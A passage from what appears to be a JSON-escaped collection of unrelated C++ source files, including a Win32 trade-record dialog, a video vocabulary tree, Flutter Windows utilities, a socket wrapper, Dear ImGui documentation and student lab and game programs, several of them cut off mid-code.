MB_OKCANCEL | MB_ICONINFORMATION) == IDOK) {\n\t\t\t\t\tfor (int y = ListView_GetItemCount(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID)) - 1; y >= 0; --y) {\n\t\t\t\t\t\tif (ListView_GetCheckState(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), y)) {\n\t\t\t\t\t\t\t//\u83b7\u53d6\u4ea4\u6613ID\n\t\t\t\t\t\t\tListView_GetItemText(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), y, 1, tempTCHAR, tradeID );\n\t\t\t\t\t\t\tData<Trade>::DataDelete(_T(\"Trade.dat\"), tempTCHAR);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t//\u51c6\u5907\u5237\u65b0\u5217\u8868\u6570\u636e\n\t\t\t//\u5220\u9664\u6240\u6709\u884c\n\t\t\tListView_DeleteAllItems(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID));\n\t\t\t//\u63d2\u5165\u884c\n\t\t\tTrade tempTrade;//\u5b58\u653e\u5c06\u8981\u8bfb\u53d6\u7684\u8bbe\u5907\u6570\u636e\n\t\t\tDWORD tempDWORD = 0;//\u5b58\u653e\u5b9e\u9645\u8bfb\u53d6\u7684\u5b57\u8282\u6570\n\t\t\tTCHAR tempTCHAR[30];\n\t\t\tLVITEM tempINSERT = { 0 };\n\t\t\tHANDLE tempHANDLE = CreateFile(_T(\"Trade.dat\"), GENERIC_READ, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);//\u6253\u5f00\u6587\u4ef6\n\t\t\tfor (int x = 0; true; ++x) {\n\t\t\t\tReadFile(tempHANDLE, &tempTrade, sizeof(Trade), &tempDWORD, NULL);//\u8bfb\u53d6\u6587\u4ef6\n\t\t\t\tif (!tempDWORD)break;\n\t\t\t\ttempINSERT.mask = LVIF_TEXT;\n\t\t\t\ttempINSERT.iItem = x;\n\t\t\t\ttempINSERT.iSubItem = 0;\n\t\t\t\t_stprintf_s(tempTCHAR, _T(\"%d\"), x + 1);\n\t\t\t\ttempINSERT.pszText = tempTCHAR;\n\t\t\t\tListView_InsertItem(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), &tempINSERT);\n\n\t\t\t\t++tempINSERT.iSubItem;\n\t\t\t\ttempINSERT.pszText = tempTrade.mID;\n\t\t\t\tListView_SetItem(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), &tempINSERT);\n\n\t\t\t\t++tempINSERT.iSubItem;\n\t\t\t\t_stprintf_s(tempTCHAR, _T(\"%d\"), tempTrade.mMoney);\n\t\t\t\ttempINSERT.pszText = tempTCHAR;\n\t\t\t\tListView_SetItem(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), &tempINSERT);\n\n\t\t\t\t++tempINSERT.iSubItem;\n\t\t\t\ttempINSERT.pszText = tempTrade.mUserName;\n\t\t\t\tListView_SetItem(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), &tempINSERT);\n\n\t\t\t\t++tempINSERT.iSubItem;\n\t\t\t\ttempINSERT.pszText = tempTrade.mDevID;\n\t\t\t\tListView_SetItem(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), &tempINSERT);\n\n\t\t\t\t++tempINSERT.iSubItem;\n\t\t\t\t_stprintf_s(tempTCHAR, tempTrade.mTime.mDate);\n\t\t\t\twcscat_s(tempTCHAR, _T(\" \"));\n\t\t\t\twcscat_s(tempTCHAR, tempTrade.mTime.mMoment);\n\t\t\t\ttempINSERT.pszText = tempTCHAR;\n\t\t\t\tListView_SetItem(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID), &tempINSERT);\n\t\t\t}\n\t\t\tCloseHandle(tempHANDLE);//\u5173\u95ed\u6587\u4ef6\n\n\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\tInvalidateRect(Trade::TradeInfoProc_hwnd, NULL, TRUE);\n\t\t\tSendMessage(Trade::TradeInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\n\t\t\tbreak;\n\t\t}\n\t\tcase tradeSelectSysLinkID:\n\t\t{\n\t\t\tMyWnds::dialogFlag = dialogTradeSelect;\n\t\t\tMyWnds::Dialog();\n\t\t\tbreak;\n\t\t}\n\t\tcase returnSysLinkID:\n\t\t{\n\t\t\t//\u9500\u6bc1\u201c\u8fd4\u56de\u201d\n\t\t\tDestroyWindow(GetDlgItem(Trade::TradeInfoProc_hwnd, returnSysLinkID));\n\t\t\tShowWindow(GetDlgItem(Trade::TradeInfoProc_hwnd, tradeSelectSysLinkID), SW_SHOW);\n\t\t\tShowWindow(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoSysLinkID), SW_SHOW);\n\t\t\t//\u5220\u9664\u5217\u8868\n\t\t\tDestroyWindow(GetDlgItem(Trade::TradeInfoProc_hwnd, dataInfoListID));\n\t\t\t//\u91cd\u5efa\u4ea4\u6613\u8bb0\u5f55\u5217\u8868\n\t\t\tCreateWindowEx(\n\t\t\t\t0, WC_LISTVIEW, _T(\"\"), WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | WS_HSCROLL | LVS_RE",
    "#include <iostream>\n#include <numeric>\n\n#include \"RobinHood.h\"\n#include \"VocabularyTree.h\"\n#include \"MiniBatchKMeans.h\"\n#include \"VecPersistor.h\"\n#include \"MatPersistor.h\"\n#include \"KMeans.h\"\n\nVocabularyTree::VideoDescriptor VocabularyTree::VideoDescriptor::INVALID = { std::numeric_limits<decltype(frame)>::max(), std::numeric_limits<decltype(video)>::max() };\n\nsize_t computeTotalSize(int clusters, int depth, size_t featureCount) {\n    size_t total = featureCount;\n    if (depth == 0)\n        return total;\n\n    for (int i = 0; i < clusters; ++i) {\n        total += computeTotalSize(clusters, depth - 1, featureCount / clusters);\n    }\n    return total;\n}\n\nVocabularyTree::VocabularyTree(Catalog& catalog, const std::string& prefix) \n    : catalog(catalog), prefix(prefix) {\n    VecPersistor::restore(prefix + \".index\", index);\n    VecPersistor::restore(prefix + \".leaves\", leaves);\n    VecPersistor::restore(prefix + \".comps\", components);\n\n    MatPersistor pers1(prefix + \".centers\"); pers1.openRead(); pers1.read(centers);\n    MatPersistor pers2(prefix + \".weights\"); pers2.openRead(); pers2.read(weights);\n\n    // replace me\n    FileStorage file(prefix + \".info\", cv::FileStorage::READ);\n    clusters         = (int) file[\"clusters\"];\n    height           = (int) file[\"depth\"];\n    dbSize           = (int) file[\"dbSize\"];\n    nodeCount        = (int) file[\"nNodes\"];\n    usedNodes        = (int) file[\"nextIdNode\"];\n    usedLeaves       = (int) file[\"nextIdLeaf\"];\n    totalDescriptors = (int) file[\"totDescriptors\"];\n\n    imageCount = 0;\n    const auto indices = catalog.getVideoIndices();\n    videoCount = indices.size();\n    for (auto index : indices) {\n        auto info = catalog.getVideoInfo(index);\n        imageCount = std::max((size_t)info[info.size() - 1].frame + 1, imageCount);\n    }\n}\n\nVocabularyTree::VocabularyTree(int clusters, int height, int batchSize, int minDescriptors, int max_iterations, int max_no_improvements, double tolerance, Catalog& catalog, const std::string& prefix) \n    : clusters(clusters), height(height), batchSize(batchSize), catalog(catalog), minDescriptors(minDescriptors), prefix(prefix), max_iterations(max_iterations), max_no_improvements(max_no_improvements), tolerance(tolerance) {\n}\n\nvoid VocabularyTree::query(cv::Mat image, std::vector<Matching>& matching, double threshold) {\n    // std::unordered_map<uint32_t, float> q;\n    std::vector<float> q(nodeCount, 0.0f);\n\n    double sum = 0.0;\n    std::vector<uint32_t> path;\n    for (size_t i = 0; i < image.rows; i++) {\n        cv::Mat descriptor = image.row(i);\n        findPath(descriptor, path);\n\n        for (uint32_t nodeID : path) {\n            const uint32_t nodeIndex = index[nodeID];\n            const float weight = weights.at<float>(nodeIndex);\n            if (weight > 0.0f && !std::isinf(weight)) {\n                q[nodeIndex] += weight;\n                sum += weight;\n            }\n        }\n    }\n\n    for (auto& qi : q) {\n        qi /= sum;\n    }\n\n    //std::unordered_map<VideoDescriptor, Matching, VideoHash> matches; \n    //robin_hood::unordered_map<VideoDescriptor, Matching, VideoHash> matches;\n    matching.clear();\n    matching.resize(videoCount * imageCount, Matching());\n\n    for (size_t i = 0; i < q.size(); ++i) {\n        const float qi = q[i];\n        if (qi > 0.0f) {\n            for (const auto& c : components[i]) {\n                const float di = c.value;\n                const float diff = std::abs(qi - di);\n\n                Matching& match = matching[c.descriptor.video * imageCount + c.descriptor.frame];\n                match.frame = c.descriptor.frame;\n                match.video = c.descriptor.video;\n                match.score += (diff - di - qi);\n                match.count++;\n            }\n        }\n    }\n\n    /*for (const auto& m : matches) {\n        matching.push_back(m.second);\n    }*/\n    matching.erase(std::remove_if(std::begin(matching), std::end(matching), [threshold] (const auto& match) {\n        return match.count == 0 || match.score > -threshold; \n    }), matching.end());\n\n    std::sort(matching.begin(), matching.end(), [](const auto& a, const auto& b) {\n        return a.score < b.score;\n    });\n}\n\nvoid VocabularyTree::create(int subsample_frames, bool in_memory) {\n    std::vector<VideoIndex> fileDescriptors = catalog.constructDescriptors(subsample_frames, in_memory);\n    const auto size = fileDescriptors.size();\n    std::cout << \"Construct Tree for \" << size << \" descriptors\" << std::endl;\n\n    std::cout << \"Allocate Clusters\" << std::endl;\n    allocateNodes();\n\n    std::cout << \"Compute Clusters\" << std::endl;\n    createNode(0, 0, fileDescriptors);\n\n    std::cout << \"\\nSave Clusters\" << std::endl;\n    storeNodes();\n\n    std::cout << \"Compute Inverted Index\" << std::endl;\n    computeInvertedIndex();\n\n    std::cout << \"\\nStore Inverted Index\" << std::endl;\n    storeInvertedIndex();\n\n    computeVectors();\n    std::cout << \"\\n\\n\\n\" << std::endl;\n\n    std::cout << \"-----------------------------\" << std::endl;\n    std:",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"cs/network/socket.hpp\"\n#include \"cs/diagnostics/exception.hpp\"\n#include <fcntl.h>\n\n\n/* bind */\nauto cs::bind(const cs::socket& ___sock, const cs::address& ___addr) -> void {\n\n\t// bind socket to address\n\tconst auto ret = ::bind(___sock, &___addr.as_sockaddr(), ___addr.size());\n\n\tif (ret != 0)\n\t\tthrow cs::runtime_error{\"failed to bind socket to address\"};\n}\n\n/* listen */\nauto cs::listen(const cs::socket& ___sock, const int ___backlog) -> void {\n\n\t// listen on socket\n\tconst auto ret = ::listen(___sock, ___backlog);\n\n\tif (ret != 0)\n\t\tthrow cs::runtime_error{\"failed to listen on socket\"};\n}\n\n/* accept */\nauto cs::accept(const cs::socket& ___sock, cs::address& ___addr) -> cs::socket {\n\n\t// accept\n\tconst auto ___ns = ::accept(___sock, &___addr.as_sockaddr(),\n\t\t\t\t\t\t\t\t\t\t &___addr.size());\n\n\t// check for error\n\tif (___ns == cs::socket::INVALID_SOCKET)\n\t\tthrow cs::runtime_error{\"failed to accept client\"};\n\n\treturn cs::socket{___ns};\n}\n\n/* non-blocking */\nauto cs::non_blocking(const cs::socket& ___so) -> void {\n\n\tconst int state = ::fcntl(___so, F_SETFL, O_NONBLOCK);\n\n\tif (state == -1)\n\t\tthrow cs::runtime_error{\"non_blocking failed\"};\n}\n\n/* blocking */\nauto blocking(const cs::socket& ___so) -> void {\n\n\tconst int state = ::fcntl(___so, F_SETFL, 0);\n\n\tif (state == -1)\n\t\tthrow cs::runtime_error{\"blocking failed\"};\n}\n\n/* shutdown */\nauto cs::shutdown(const cs::socket& ___so, const int ___how) -> void {\n\n\tconst int state = ::shutdown(___so, ___how);\n\n\tif (state != 0)\n\t\tthrow cs::runtime_error{\"shutdown failed\"};\n}\n/* reuse address */\nauto cs::reuse_address(const cs::socket& ___so) -> void {\n\n\tint opt = 1;\n\n\tif (::setsockopt(___so, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1)\n\t\tthrow cs::runtime_error{\"failed to set socket options\"};\n}\n\n\n\n",
    "// dear imgui, v1.85 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     \n// ://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.",
    "/*\n Program Name: Exception_Handling.cpp\n Programmer: Moris Gomez\n Date: Tuesday 05/2/2024\n Version Control: 10.0\n About: Week 12, CSCI 2, Lab.\n Description:\n Write a class named TestScores. The class constructor\n should accept an array of test scores as its argument.\n The class should have a member function that returns the\n average of the test scores. If any test score in the\n array is negative or greater than 100, the class should\n throw an exception. Demonstrate the class in a program.\n */\n\n#include <iostream>\nusing namespace std;\n\nclass TestScores\n{\nprivate:\n    int size;\n    int *ptrScores; //points to address of first value in array.\npublic:\n    //nested class for throwing object type to catch:\n    class InvalidScore\n    {\n        //empty class btw.\n    }; //end nested class NegativeScore.\n    \n    //constructor:\n    TestScores(int s, int *ptr) //pointer to array in main.\n    {\n        size = s;\n        ptrScores = ptr;\n    }\n    \n    //function #1:\n    double average()\n    {\n        double sum = 0.0; //sumTracker.\n        //loop through array:\n        for (int i = 0; i < size; i++)\n        {\n            if(ptrScores[i] < 0 || ptrScores[i] > 100)\n            {\n                throw InvalidScore();\n                //type of throw & catch is object.\n            }\n            else\n            {\n                sum = sum + ptrScores[i];\n                //ptrScores[0] same as *ptrScores\n                //ptrScores[1] same as *ptrScores\n            }\n        } //end loop.\n        return sum/size;\n    } //end function average.\n}; //end class TestScores.\n\n\nint main()\n{\n    int sizeArray = 5;\n    int array[5] = {0, 80, 90, 91, 111}; //ERROR.\n    TestScores s1(sizeArray, array);\n        \n    try\n    {\n        cout << \"average of test scores: \" << s1.average() << endl;\n    } //end try.\n    \n    catch(TestScores::InvalidScore) //type of throw & catch is object.\n    {\n        cout << endl << \"[ERROR] <-- Test scores cannot be negative or greater than 100 -->\" << endl;\n    } //end catch.\n    return 0;\n}\n",
    "/*\r\n-> function th check if the input is equal to (x-o) only or not                 (DONE)\r\n-> function to check if the place of the element is empty or not                (DONE)\r\n-> function to check if every row in the back of the array is complete or not   (DONE)\r\n-> fniction to add new element to the array                                     (DONE)\r\n-> function to check if any player is winning or not (*diagnol*)                (DONE)\r\n-> function to print the table and                                              (DONE)\r\n-> function to the turn in who                                                  (DONE)\r\n\r\n                                     | 1 | 2 | 3 | 4 | 5 | 6 | 7 |\r\n                                     -----------------------------\r\n                                   1 |   |   |   |   |   |   |   |\r\n                                     -----------------------------\r\n                                   2 |   |   |   |   |   |   |   |\r\n                                     -----------------------------\r\n                                   3 |   |   |   |   |   |   |   |\r\n                                     -----------------------------\r\n                                   4 |   |   |   |   |   |   |   |\r\n                                     -----------------------------\r\n                                   5 |   |   |   |   |   |   |   |\r\n                                     -----------------------------\r\n                                   6 |   |   |   |   |   |   |   |\r\n                                     -----------------------------\r\n                                   7 |   |   |   |   |   |   |   |\r\n                                     -----------------------------\r\n\r\n\r\n*/\r\n#include <iostream>\r\n#include <windows.h> \r\nusing namespace std;\r\n\r\nchar arr[7][7];\r\nint mostInCoulmns[] = { 6,6,6,6,6,6,6 };\r\nchar player1, player2;\r\n\r\nbool flag = true;\r\n\r\nbool x = false;\r\nbool o = false;\r\nvoid display() {\r\n    system(\"cls\");\r\n\r\n    cout << \"    1 | 2 | 3 | 4 | 5 | 6 | 7 |\" << '\\n';\r\n    cout << \"  -----------------------------\" << '\\n';\r\n    for (int i = 0; i < 7; i++) {\r\n        cout << i + 1 << ' ';\r\n        for (int j = 0; j < 7; j++) {\r\n            if (!arr[i][j]) {\r\n                cout << \"| \" << ' ' << ' ';\r\n            }\r\n            else {\r\n                cout << \"| \" << arr[i][j] << ' ';\r\n            }\r\n        }\r\n        cout << '|' << '\\n';\r\n        cout << \"  -----------------------------\\n\";\r\n    }\r\n}\r\nvoid check(char C1, char C2) {    //\u0647\u0646\u0627 \u0632\u064a \u0627\u0644\u0628\u0631\u0648\u062c\u0643\u062a \u0627\u0644\u0627\u0648\u0644 \u062f\u064a \u0628\u062a\u0634\u0648\u0641 \u0647\u0644 \u0627\u0644\u062d\u0631\u0641 \u0627\u0644\u0644\u064a \u062f\u0627\u062e\u0644 \u0645\u0638\u0628\u0648\u0637 \u0648\u0644\u0627 \u0644\u0627 \u0648\u0628\u062a\u062e\u062a\u0628\u0631 \u0643\u0644 \u062d\u0627\u062c\u0647\r\n    if ((toupper(C1) != 'X') && toupper(C1) != 'O') {\r\n        cout << \"Player 1 -> You have to choose betwen X or O ONLY\" << endl;\r\n        cin >> C1;\r\n        check(C1, C2);\r\n        return;\r\n    }\r\n    if (toupper(C2) != 'X' && toupper(C2) != 'O') {\r\n        cout << \"Player 2 -> You have to choose betwen X or O ONLY\" << endl;\r\n        cin >> C2;\r\n        check(C1, C2);\r\n        return;\r\n    }\r\n    if (C1 == C2) {\r\n        cout << \"You can't choose \" << C1 << \" (player 1) have it choose something else\" << '\\n';\r\n        cin >> C2;\r\n    }\r\n    else {\r\n        player1 = C1;\r\n        player2 = C2;\r\n        return;\r\n    }\r\n    check(C1, C2);\r\n}\r\nvoid game() {\r\n    if (flag) {\r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"  player 1 it's your turn\" << \"\\n\";\r\n        cout << \"  -----------------------\" << \"\\n\\n\";\r\n        cout << \"--choose your Coordinates--\" << '\\n';\r\n        int x;\r\n        cin >> x;\r\n        if (mostInCoulmns[x - 1] < 0) {         //\u0647\u0646\u0627 \u0628\u062a\u0634\u0648\u0641 \u0644\u0648 \u0627\u0644\u0639\u0645\u0648\u062f \u062f\u0627 \u0645\u0644\u064a\u0627\u0646 \u0648\u0644\u0627 \u0644\u0627 \u0639\u0644\u064a \u062d\u0633\u0628 \u0627\u0644\u0627\u0631\u0631\u0627\u064a \u0627\u0644\u0644\u064a \u0641\u0648\u0642 \u0643\u0644 \u0645 \u0627\u0644\u0639\u0645\u0648\u062f \u0628\u064a\u0627\u062e\u062f \u0639\u0646\u0635\u0631 \u0628\u064a\u0646\u0627\u0642\u0635 \u0648\u0627\u062d\u062f \u0644\u0648 \u0648\u0635\u0644\u062a \u0641 \u0627\u0644\u0635\u0641\u0631 \u0643\u062f\u0647 \u0645\u0639\u0646\u0627\u0647 \u0627\u0646 \u0627\u0644\u0639\u0645\u0648\u062f \u0627\u062a\u0645\u0644\u064a\r\n            cout << \"The column is complete choose another column \\n\";\r\n            game();\r\n            return;\r\n        }\r\n        if (x > 7) {\r\n            cout << \"The number must be less than or equel 7\" << '\\n';\r\n            game();\r\n            return;\r\n        }\r\n\r\n        arr[mostInCoulmns[x - 1] ][x - 1] = toupper(player1);         //   \u0627\u0648\u0644 \u0627\u062a\u0646\u064a\u0646[]\u0645\u0639\u0646\u0627\u0647\u0645 \u0627\u0646 \u064a\u062d\u0637 \u0641\u064a \u0627\u0644\u0635\u0641 \u0627\u0644\u0644\u064a \u0641 \u0627\u0644\u0627\u0631\u0631\u0627\u064a \u0648\u0627\u0642\u0641\u0647 \u0639\u0646\u062f\u0647\u0627 \u064a\u0639\u0646\u064a \u0647\u0648 \u0647\u064a\u062c\u064a\u0628 \u0627\u0644\u0631\u0642\u0645 \u0645\u0646 \u0627\u0644\u0627\u0631\u0631\u0627\u064a \u0627\u0644\u0644\u064a \u0627\u062d\u0646\u0627 \u0628\u0646\u0646\u0642\u0635 \u0643\u0644 \u0645 \u064a\u062a\u062d\u0637 \u0641 \u0639\u0645\u0648\u062f \u0648\u0627\u062d\u062f\r\n        mostInCoulmns[x - 1]--;                                //\u0628\u064a\u0646\u0642\u0635 \u0645\u0646 \u0627\u0644\u0639\u0645\u0648\u062f \u0648\u0627\u062d\u062f \r\n        flag = !flag;\r\n    }\r\n    else {\r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"  player 2 it's your turn\" << \"\\n\";\r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"--choose your Coordinates--\" << '\\n';\r\n        int x;\r\n        cin >> x;\r\n        if (mostInCoulmns[x - 1] <= 0) {              //\u0647\u0646\u0627 \u0628\u062a\u0634\u0648\u0641 \u0644\u0648 \u0627\u0644\u0639\u0645\u0648\u062f \u062f\u0627 \u0645\u0644\u064a\u0627\u0646 \u0648\u0644\u0627 \u0644\u0627 \u0639\u0644\u064a \u062d\u0633\u0628 \u0627\u0644\u0627\u0631\u0631\u0627\u064a \u0627\u0644\u0644\u064a \u0641\u0648\u0642 \u0643\u0644 \u0645 \u0627\u0644\u0639\u0645\u0648\u062f \u0628\u064a\u0627\u062e\u062f \u0639\u0646\u0635\u0631 \u0628\u064a\u0646\u0627\u0642\u0635 \u0648\u0627\u062d\u062f \u0644\u0648 \u0648\u0635\u0644\u062a \u0641 \u0627\u0644\u0635\u0641\u0631 \u0643\u062f\u0647 \u0645\u0639\u0646\u0627\u0647 \u0627\u0646 \u0627\u0644\u0639\u0645\u0648\u062f \u0627\u062a\u0645\u0644\u064a\r\n            cout << \"The column is complete choose another column \\n\";\r\n            game();\r\n            return;\r\n        }\r\n        if (x > 7) {\r\n            cout << \"the number must be less than or equel 7\" << '\\n';\r\n            gam",
    "#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <thread>\n#include <filesystem>\n#include <map>\n#include <mutex>\n#include <string>\n#include <cmath>\n#include <iomanip>\n#include <limits>\n#include <chrono>\n\nnamespace fs = std::filesystem;\nstd::mutex io_mutex;\n\nstd::string formatNumber(int num, int length)\n{\n    std::ostringstream oss;\n    oss << std::setw(length) << std::setfill('0') << num;\n    return oss.str();\n}\n\nstd::map<char, cv::Mat> load_font_images(const std::string &font_dir)\n{\n    std::map<char, cv::Mat> font_images;\n    for (const auto &entry : fs::directory_iterator(font_dir))\n    {\n        if (entry.path().extension() == \".png\")\n        {\n            std::string filename = entry.path().stem().string();\n            int char_code;\n            try\n            {\n                char_code = std::stoi(filename);\n            }\n            catch (const std::invalid_argument &ia)\n            {\n                std::cerr << \"Invalid argument: \" << ia.what() << '\\n';\n                continue;\n            }\n            catch (const std::out_of_range &oor)\n            {\n                std::cerr << \"Out of Range error: \" << oor.what() << '\\n';\n                continue;\n            }\n\n            if (char_code < 0 || char_code > 255)\n            {\n                std::cerr << \"Character code out of valid range: \" << char_code << '\\n';\n                continue;\n            }\n\n            char char_code_char = static_cast<char>(char_code);\n            cv::Mat img = cv::imread(entry.path(), cv::IMREAD_GRAYSCALE);\n            if (img.empty())\n            {\n                std::cerr << \"Failed to load image for char code \" << char_code_char << \" at path \" << entry.path() << std::endl;\n                continue;\n            }\n\n            font_images[char_code_char] = img;\n        }\n    }\n    return font_images;\n}\n\nstd::pair<char, cv::Mat> compare_matrices(const cv::Mat &segment, const std::map<char, cv::Mat> &font_images)\n{\n    double min_distance = std::numeric_limits<double>::max();\n    char best_match_char = 0;\n    cv::Mat best_match_img;\n\n    for (const auto &[char_code, font_image] : font_images)\n    {\n        if (!segment.empty() && !font_image.empty() && segment.type() == font_image.type() && segment.size() == font_image.size())\n        {\n            cv::Mat font_image_inv;\n            cv::bitwise_not(font_image, font_image_inv); // For some reason, the images need to be inverted for the comparison to work\n            cv::bitwise_not(segment, segment);           // Same thing here\n\n            double distance = cv::norm(segment, font_image_inv, cv::NORM_L2);\n\n            if (distance < min_distance)\n            {\n                min_distance = distance;\n                best_match_char = char_code;\n                best_match_img = font_image;\n            }\n        }\n        else\n        {\n            std::cerr << \"Incompatible or empty images for char \" << char_code << std::endl;\n        }\n    }\n    if (best_match_char <= 0 || best_match_char > 127)\n    {\n        std::cerr << \"Invalid character match detected, using default.\" << std::endl;\n        best_match_char = '?'; // Default character if no valid match found\n    }\n    return {best_match_char, 